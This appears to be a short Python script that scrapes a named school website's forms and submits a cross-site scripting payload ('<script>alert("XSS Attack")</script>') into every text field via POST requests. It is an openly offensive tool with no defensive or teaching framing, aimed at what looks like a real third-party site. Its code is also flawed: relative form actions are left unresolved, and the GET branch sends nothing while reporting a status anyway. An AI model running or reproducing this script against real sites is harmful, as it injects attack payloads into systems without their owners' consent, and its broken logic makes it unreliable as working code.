import requests
from bs4 import BeautifulSoup

def scrape_and_attack(url):
    # Send a GET request to the target website
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Failed to retrieve the page. Status code: {response.status_code}")
        return

    # Parse the HTML content
    soup = BeautifulSoup(response.content, 'html.parser')

    # Find all form elements
    forms = soup.find_all('form')

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')

        # Prepare data for the form
        data = {}
        for input_tag in inputs:
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            if input_name:
                data[input_name] = '<script>alert("XSS Attack")</script>' if input_type == 'text' else ''

        # Send a POST request with malicious data
        if method == 'post':
            post_response = requests.post(action, data=data)
            print(f"POST request sent to {action} with status code: {post_response.status_code}")
        else:
            print(f"GET request sent to {action} with status code: {response.status_code}")

if __name__ == "__main__":
    target_url = "https://eminentschool.com/homes/getContactInfo"  # Replace with the target URL
    scrape_and_attack(target_url)
    print("done")